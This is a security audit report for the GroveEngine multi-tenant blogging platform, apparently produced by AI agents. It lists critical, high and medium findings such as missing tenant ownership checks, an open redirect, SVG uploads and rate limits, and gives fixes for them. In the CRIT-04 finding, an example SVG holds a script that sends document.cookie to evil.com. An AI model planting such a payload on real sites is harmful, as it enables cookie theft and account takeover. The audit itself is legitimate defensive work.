# GroveEngine Security Audit Report
## Pre-v1.0 Release - Comprehensive Multi-Agent Audit

**Audit Date:** 2026-01-11
**Platform:** GroveEngine/Lattice Multi-Tenant Blog Platform
**Version:** 0.9.3 (approaching v1.0)
**Methodology:** 10 parallel specialized security agents

---

## Executive Summary

This security audit was conducted using 10 specialized agents running in parallel, each examining a critical attack surface of the GroveEngine platform. The audit identified **8 CRITICAL**, **15 HIGH**, and **12 MEDIUM** severity issues that require attention before the v1.0 launch.

### Risk Summary

| Severity | Count | Remediation Required |
|----------|-------|---------------------|
| 🔴 CRITICAL | 8 | Before v1.0 launch |
| 🟠 HIGH | 15 | Before v1.0 launch |
| 🟡 MEDIUM | 12 | Within 30 days of launch |
| ✅ POSITIVE | 15+ | Security strengths identified |

### Overall Security Posture

**Current State:** MODERATE RISK - Not ready for production
**After Remediation:** LOW RISK - Production ready

**Key Strengths:**
- Excellent TenantDb database isolation wrapper
- Strong DOMPurify XSS protection
- Comprehensive R2 storage isolation with tests
- Good CSRF protection in main engine
- Properly structured secrets management

**Key Gaps:**
- Missing tenant ownership verification in API endpoints
- No Cloudflare edge rate limiting
- Missing HSTS headers
- Inconsistent security header coverage

---

## Audit Methodology

### Agent Breakdown

| Agent ID | Focus Area | Files Examined | Duration |
|----------|-----------|----------------|----------|
| `aa7cf47` | Authentication & Session Security | 35+ | 4 min |
| `a6874f6` | SQL Injection & Database Security | 25+ | 3 min |
| `a4d7b46` | XSS & Input Validation | 40+ | 4 min |
| `a35d9aa` | Secrets & Credential Handling | 30+ | 3 min |
| `a0e57c0` | Multi-Tenant Isolation | 45+ | 5 min |
| `a812f4d` | Stripe Payment Security | 20+ | 4 min |
| `a89e6ae` | File Upload & R2 Storage | 25+ | 3 min |
| `a37d36c` | Security Headers & CORS | 30+ | 4 min |
| `aaa7b71` | Dependency Vulnerabilities | 15+ | 2 min |
| `ae9ddd6` | Rate Limiting & DoS Protection | 35+ | 4 min |

**Total Files Examined:** 300+
**Total Audit Duration:** ~5 minutes (parallel execution)

---

## Critical Issues (8)

### CRIT-01: Missing Tenant Ownership Verification in API Endpoints
**Agent:** Multi-Tenant Isolation (`a0e57c0`)
**Confidence:** 100/100

**Description:**
API endpoints check for authentication (`locals.user`) and tenant context (`locals.tenantId`) but do NOT verify that the authenticated user owns the tenant. The tenant context is derived from the subdomain URL, allowing any authenticated user to modify any tenant's data.

**Affected Files:**
- `/packages/engine/src/routes/api/posts/+server.ts`
- `/packages/engine/src/routes/api/posts/[slug]/+server.ts`
- `/packages/engine/src/routes/api/pages/+server.ts`
- `/packages/engine/src/routes/api/pages/[slug]/+server.ts`
- `/packages/engine/src/routes/api/admin/settings/+server.ts`
- `/packages/engine/src/routes/api/images/upload/+server.ts`
- `/packages/engine/src/routes/api/images/delete/+server.ts`
- `/packages/engine/src/routes/api/images/list/+server.ts`
- `/packages/engine/src/routes/api/images/analyze/+server.ts`

**Attack Scenario:**
1. Alice authenticates via Heartwood
2. Alice visits `bob.grove.place` (Bob's subdomain)
3. `hooks.server.ts` sets `locals.tenantId` = Bob's tenant ID
4. Alice calls `POST /api/posts` and creates content on Bob's blog
5. No ownership check prevents this

**Impact:** Complete unauthorized access to any tenant's data

**Remediation:**
```typescript
import { getVerifiedTenantId } from "$lib/auth/session.js";

// In every mutation handler:
const tenantId = await getVerifiedTenantId(
  platform.env.DB,
  locals.tenantId,
  locals.user
);
```

---

### CRIT-02: Open Redirect Vulnerability
**Agent:** XSS & Input Validation (`a4d7b46`)
**Confidence:** 95/100

**Description:**
The `/verify` endpoint accepts a `returnTo` parameter that is not validated, allowing redirects to any external URL.

**Affected Files:**
- `/packages/engine/src/routes/verify/+page.server.ts` (lines 20-21)

**Current Code:**
```typescript
const returnTo = url.searchParams.get('returnTo') || '/';
throw redirect(302, returnTo); // ❌ No validation
```

**Impact:** Phishing attacks via legitimate Grove URLs

**Remediation:** Validate `returnTo` is a relative path or same-origin URL.

---

### CRIT-03: Debug Logging Exposes Environment Variables
**Agent:** Secrets & Credentials (`a35d9aa`)
**Confidence:** 90/100

**Description:**
Environment variable keys are logged in production, potentially exposing sensitive configuration structure.

**Affected Files:**
- `/landing/src/routes/api/signup/+server.ts` (lines 6-11)

**Current Code:**
```typescript
console.log('Environment check:', {
  hasDB: !!platform?.env?.DB,
  envKeys: Object.keys(platform?.env || {}), // ❌ Exposes env keys
});
```

**Impact:** Information disclosure of environment configuration

**Remediation:** Remove debug logging or redact sensitive information.

---

### CRIT-04: SVG Upload Without Sanitization
**Agent:** File Upload & R2 Storage (`a89e6ae`)
**Confidence:** 95/100

**Description:**
SVG files are in `ALLOWED_CONTENT_TYPES` but are not sanitized. SVG can contain embedded JavaScript, enabling XSS attacks.

**Affected Files:**
- `/packages/engine/src/lib/server/services/storage.ts` (line 135)

**Attack Vector:**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
</svg>
```

**Impact:** Stored XSS via malicious SVG uploads

**Remediation:** Remove SVG from allowed types or implement server-side sanitization with DOMPurify.

---

### CRIT-05: Missing tenant_id in image_hashes Table
**Agent:** File Upload & R2 Storage (`a89e6ae`)
**Confidence:** 100/100

**Description:**
The `image_hashes` table schema is missing the `tenant_id` column, but code attempts to use it. This causes cross-tenant image URL exposure via duplicate detection.

**Affected Files:**
- `/packages/engine/migrations/006_image_hashes.sql` (lines 4-13)
- `/packages/engine/src/routes/api/images/upload/+server.ts` (lines 97-100)

**Impact:** Tenant A's duplicate detection could return Tenant B's image URLs

**Remediation:** Add migration to add `tenant_id` column with composite unique constraint.

---

### CRIT-06: No Cloudflare Edge Rate Limiting
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)
**Confidence:** 100/100

**Description:**
All rate limiting is application-level in Workers. Attack traffic reaches Workers before being blocked, generating billing costs.

**Affected Infrastructure:**
- Cloudflare Dashboard (no WAF rate limiting rules configured)

**Impact:** DDoS attacks cost money before being blocked; potential service disruption

**Remediation:** Deploy Cloudflare WAF rate limiting rules for:
- General: 1000 req/min per IP
- Auth: 50 req/5min per IP
- Upload: 100 req/hour per IP
- AI: 500 req/day per IP

---

### CRIT-07: AI Image Analysis Without Rate Limiting
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)
**Confidence:** 100/100

**Description:**
The AI image analyze endpoint calls Claude API (~$0.003/request) with no rate limiting. Attackers can cause massive API costs.

**Affected Files:**
- `/packages/engine/src/routes/api/images/analyze/+server.ts`

**Impact:** Unlimited API cost exposure

**Remediation:** Add rate limit of 20 analyses per day per user before Claude API call.

---

### CRIT-08: Missing HSTS Header on All Applications
**Agent:** Security Headers & CORS (`a37d36c`)
**Confidence:** 90/100

**Description:**
No application sets the `Strict-Transport-Security` header, leaving users vulnerable to SSL stripping attacks.

**Affected Files:**
- `/packages/engine/src/hooks.server.ts`
- `/landing/src/hooks.server.ts`
- `/plant/src/hooks.server.ts`
- `/domains/src/hooks.server.ts`

**Impact:** Protocol downgrade attacks, cookie hijacking during initial redirect

**Remediation:**
```typescript
response.headers.set(
  "Strict-Transport-Security",
  "max-age=31536000; includeSubDomains; preload"
);
```

---

## High Severity Issues (15)

### HIGH-01: PII Logged in Stripe Webhook Handler
**Agent:** Stripe Payment Security (`a812f4d`)

Customer emails, usernames, and error details containing PII are logged to console.

**Files:** `/plant/src/routes/api/webhooks/stripe/+server.ts` (20+ lines)

---

### HIGH-02: Webhook Race Condition in Tenant Creation
**Agent:** Stripe Payment Security (`a812f4d`)

Both webhook and success page attempt tenant creation with only existence check, potential for duplicates.

**Files:**
- `/plant/src/routes/api/webhooks/stripe/+server.ts`
- `/plant/src/routes/success/+page.server.ts`

---

### HIGH-03: Dynamic SQL Column Names in Shop
**Agent:** SQL Injection & Database (`a6874f6`)

Dynamic UPDATE statements with unvalidated column names create SQL injection risk.

**Files:** `/packages/engine/src/lib/payments/shop.ts` (3 locations)

---

### HIGH-04: Missing CSRF Protection in Landing/Domains Apps
**Agent:** Auth & Session Security (`aa7cf47`)

The landing and domains apps have inconsistent CSRF protection compared to the main engine.

**Files:**
- `/landing/src/hooks.server.ts`
- `/domains/src/hooks.server.ts`

---

### HIGH-05: Admin Layout Loads Data Without Ownership Check
**Agent:** Multi-Tenant Isolation (`a0e57c0`)

Admin layout server loads tenant data based on `locals.tenantId` without verifying ownership.

**Files:** `/packages/engine/src/routes/admin/+layout.server.ts` (lines 20-48)

---

### HIGH-06: Token Refresh Race Condition
**Agent:** Auth & Session Security (`aa7cf47`)

Potential race condition in token refresh logic in domains app.

**Files:** `/domains/src/lib/auth.ts`

---

### HIGH-07: Client Secret in Debug Logs
**Agent:** Secrets & Credentials (`a35d9aa`)

Potential for client secrets to appear in debug/error logs.

**Files:** Multiple locations (requires audit)

---

### HIGH-08: Wildcard CORS on CDN Endpoints
**Agent:** Security Headers & CORS (`a37d36c`)

CDN endpoints use `Access-Control-Allow-Origin: *`, allowing any website to embed content.

**Files:**
- `/landing/src/routes/cdn/[...path]/+server.ts` (line 38)
- `/packages/grove-router/src/index.ts` (line 152)

---

### HIGH-09: Missing Security Headers on Non-Engine Apps
**Agent:** Security Headers & CORS (`a37d36c`)

Landing, plant, and domains apps lack security headers (X-Frame-Options, CSP, etc.)

**Files:**
- `/landing/src/hooks.server.ts`
- `/plant/src/hooks.server.ts`
- `/domains/src/hooks.server.ts`

---

### HIGH-10: CSP Allows unsafe-eval Globally
**Agent:** Security Headers & CORS (`a37d36c`)

CSP includes `unsafe-eval` for all pages due to Mermaid diagrams, even where not needed.

**Files:** `/packages/engine/src/hooks.server.ts` (line 400)

---

### HIGH-11: Magic Link Timing Attack (Email Enumeration)
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)

Timing differences reveal whether email is in admin list.

**Files:** `/landing/src/routes/api/auth/request-code/+server.ts`

---

### HIGH-12: Image Upload Without Rate Limiting
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)

50-100 uploads per hour should be enforced to prevent storage abuse.

**Files:** `/packages/engine/src/routes/api/images/upload/+server.ts`

---

### HIGH-13: File Extension Not Validated
**Agent:** File Upload & R2 Storage (`a89e6ae`)

MIME type validated but extension can be anything, allowing `malicious.php.jpg`.

**Files:** `/packages/engine/src/routes/api/images/upload/+server.ts` (lines 126-143)

---

### HIGH-14: Content Endpoints Without Rate Limits
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)

POST/PUT/DELETE on posts and pages have no rate limiting.

**Files:**
- `/packages/engine/src/routes/api/posts/+server.ts`
- `/packages/engine/src/routes/api/pages/+server.ts`

---

### HIGH-15: Passkey Endpoints Without Rate Limits
**Agent:** Rate Limiting & DoS Protection (`ae9ddd6`)

WebAuthn endpoints are proxied to GroveAuth without proxy-layer rate limiting.

**Files:**
- `/plant/src/routes/api/account/passkey/register-options/+server.ts`
- `/plant/src/routes/api/account/passkey/verify-registration/+server.ts`

---

## Medium Severity Issues (12)

| ID | Issue | Agent | Files |
|----|-------|-------|-------|
| MED-01 | Session cookie shared across subdomains | Auth & Session | hooks.server.ts |
| MED-02 | Missing Content-Disposition on CDN | File Upload | grove-router/src/index.ts |
| MED-03 | Hardcoded Stripe trial period | Stripe Payment | stripe.ts |
| MED-04 | Missing subscription status checks | Stripe Payment | Multiple |
| MED-05 | Incomplete webhook metadata validation | Stripe Payment | webhook handler |
| MED-06 | Hardcoded Stripe price IDs | Secrets | stripe.ts |
| MED-07 | Incomplete .gitignore coverage | Secrets | .gitignore |
| MED-08 | Missing upgrade-insecure-requests in CSP | Headers | hooks.server.ts |
| MED-09 | No image dimension validation | File Upload | upload/+server.ts |
| MED-10 | OG Worker SSRF risk | File Upload | og-worker/src/index.ts |
| MED-11 | Wisp cost cap fails open | Rate Limiting | wisp/+server.ts |
| MED-12 | Tenant isolation tests incomplete | Multi-Tenant | Multiple |

---

## Positive Security Findings

The audit identified numerous security strengths that demonstrate mature security practices:

### 1. TenantDb Wrapper (Excellent)
**Location:** `/packages/engine/src/lib/server/services/database.ts`

The `TenantDb` class provides excellent defense-in-depth:
- Automatic `tenant_id` injection on INSERT
- Automatic `tenant_id` filtering on SELECT/UPDATE/DELETE
- Table/column name validation prevents SQL injection
- Raw query validation requires `tenant_id` in SQL

### 2. DOMPurify XSS Protection (Strong)
**Location:** Multiple files using `sanitizeMarkdown()`

All user-generated content is sanitized through DOMPurify before storage and display.

### 3. R2 Storage Isolation (Strong)
**Location:**
- `/packages/engine/src/routes/api/images/upload/+server.ts`
- `/packages/engine/src/lib/server/services/tenant-isolation.test.ts`

- All R2 keys prefixed with `{tenant_id}/`
- Path traversal protection
- Ownership verification before deletion
- Comprehensive test suite (314 lines)

### 4. CSRF Protection (Good in Engine)
**Location:** `/packages/engine/src/hooks.server.ts`

- Token-based validation on mutations
- Origin validation for auth flows
- Automatic application on all POST/PUT/DELETE/PATCH

### 5. Cookie Security Flags (Good)
All session cookies include:
- `HttpOnly` - Prevents JavaScript access
- `Secure` - HTTPS only in production
- `SameSite=Lax` - CSRF protection

### 6. Stripe Webhook Signature Verification (Strong)
**Location:** `/plant/src/lib/server/stripe.ts`

- HMAC-SHA256 verification
- Constant-time comparison
- 5-minute replay window
- Idempotency via event ID storage

### 7. Parameterized Queries (Strong)
All database queries use parameterized queries through D1's `prepare().bind()` pattern. No string concatenation in SQL.

### 8. Turnstile Bot Protection (Good)
**Location:** `/packages/engine/src/lib/server/services/turnstile.ts`

- HMAC-SHA256 cookie signing
- Cloudflare Turnstile verification
- 7-day verification cookie

### 9. pnpm Overrides for Vulnerable Packages (Proactive)
**Location:** `/package.json`

```json
"pnpm": {
  "overrides": {
    "hono": ">=4.10.3",
    "cookie": ">=0.7.0",
    "esbuild": ">=0.25.0",
    "qs": ">=6.14.1"
  }
}
```

### 10. Private Registry (Good)
Publishing configured to use GitHub Packages (`npm.pkg.github.com`) rather than public npm.

### 11. No postinstall Hooks (Good)
No workspace packages have postinstall scripts, eliminating a common supply chain attack vector.

### 12. Proper Secrets Template
**Location:** `/secrets_template.json`, `/.env.example`

Clear instructions for secrets management with template files showing structure without values.

### 13. Wisp AI Cost Caps (Good)
**Location:** `/packages/engine/src/routes/api/grove/wisp/+server.ts`

Monthly cost tracking and enforcement (though error handling needs improvement).

### 14. Graduated Abuse Response (Good)
**Location:** `/packages/engine/src/lib/server/rate-limits/abuse.ts`

Warning → shadow ban → full ban system with violation decay.

### 15. Comprehensive Database Schema (Good)
**Location:** `/packages/engine/migrations/005_multi_tenant.sql`

- Tenant foreign keys with CASCADE delete
- Unique constraints scoped to tenant
- Proper indexing for tenant_id queries

---

## Attack Surface Analysis

### Attack Vector: Cross-Tenant Access
**Risk Level:** CRITICAL (before fix) → LOW (after fix)
**Current Protection:** TenantDb, R2 prefixing
**Gap:** Missing ownership verification in API layer
**Remediation:** Apply `getVerifiedTenantId()` pattern

### Attack Vector: XSS
**Risk Level:** LOW
**Current Protection:** DOMPurify, CSP (partial)
**Gap:** SVG uploads, unsafe-eval in CSP
**Remediation:** Remove SVG, per-route CSP

### Attack Vector: SQL Injection
**Risk Level:** LOW
**Current Protection:** Parameterized queries, TenantDb validation
**Gap:** Dynamic column names in shop.ts
**Remediation:** Whitelist column names

### Attack Vector: CSRF
**Risk Level:** MEDIUM
**Current Protection:** Token validation in engine
**Gap:** Inconsistent across apps
**Remediation:** Add to landing/domains apps

### Attack Vector: DoS / Resource Exhaustion
**Risk Level:** HIGH (before fix) → LOW (after fix)
**Current Protection:** Some app-level rate limiting
**Gap:** No edge protection, AI endpoints unprotected
**Remediation:** Cloudflare WAF rules, endpoint rate limits

### Attack Vector: Session Hijacking
**Risk Level:** MEDIUM
**Current Protection:** Secure cookies, SessionDO
**Gap:** Cross-subdomain session sharing
**Remediation:** Document intended behavior, consider subdomain isolation

### Attack Vector: Information Disclosure
**Risk Level:** MEDIUM
**Current Protection:** .gitignore for secrets
**Gap:** Debug logging, public settings API
**Remediation:** Remove debug logs, whitelist public settings

---

## Compliance Considerations

### PCI DSS
**Status:** SAQ A Eligible (using Stripe Checkout)
- ✅ No card data touches servers
- ✅ All payment via hosted Stripe Checkout
- ⚠️ PII in logs needs remediation

### GDPR
**Status:** Needs Review
- ✅ User data isolated by tenant
- ⚠️ Email addresses in webhook logs
- ⚠️ No data export/deletion API documented

### SOC 2
**Status:** Not Assessed
- Good foundations for Type II
- Would need formal controls documentation

---

## Remediation Priority Matrix

### Phase 1: Critical (Before v1.0 Launch)
**Timeline:** 1-2 weeks
**Items:** CRIT-01 through CRIT-08, HIGH-01 through HIGH-15

### Phase 2: Medium Priority (Within 30 days)
**Timeline:** 2-4 weeks post-launch
**Items:** MED-01 through MED-12

### Phase 3: Continuous Improvement
**Timeline:** Ongoing
- Security monitoring and alerting
- Penetration testing
- Dependency updates
- Security documentation

---

## Testing Recommendations

### Pre-Launch Testing

1. **Cross-Tenant Access Testing**
   - Verify all API endpoints reject cross-tenant requests
   - Test with authenticated user on different subdomain

2. **Rate Limit Testing**
   - Verify limits enforced on all protected endpoints
   - Test edge rate limiting (Cloudflare)

3. **Security Header Testing**
   ```bash
   curl -I https://grove.place | grep -E "Strict-Transport|X-Frame|Content-Security"
   ```

4. **Input Validation Testing**
   - Attempt XSS payloads in all content fields
   - Test file upload with various malicious files

5. **Authentication Flow Testing**
   - Session fixation attempts
   - Token refresh edge cases

### Automated Security Testing

Recommend integrating:
- OWASP ZAP for automated scanning
- Snyk for dependency scanning
- Custom tests for multi-tenant isolation

---

## Conclusion

GroveEngine has **strong security foundations** with excellent TenantDb isolation, comprehensive sanitization, and proper secrets management. However, **8 critical issues** must be addressed before v1.0 launch, primarily around:

1. **Tenant ownership verification** in API endpoints
2. **Rate limiting** for expensive operations
3. **Security headers** across all applications
4. **SVG upload** sanitization

The estimated remediation effort is **2-3 weeks** for all critical and high priority issues. With these fixes applied, the platform will have production-grade security suitable for a multi-tenant SaaS.

---

## Appendix: Agent Reports

Full reports from each security agent are available in the audit output files:
- Auth & Session: `aa7cf47`
- SQL Injection: `a6874f6`
- XSS & Input: `a4d7b46`
- Secrets: `a35d9aa`
- Multi-Tenant: `a0e57c0`
- Stripe: `a812f4d`
- File Upload: `a89e6ae`
- Headers: `a37d36c`
- Dependencies: `aaa7b71`
- Rate Limiting: `ae9ddd6`

---

**Audit Completed:** 2026-01-11
**Report Generated By:** Claude Code Security Audit System
**Classification:** Internal - Security Sensitive
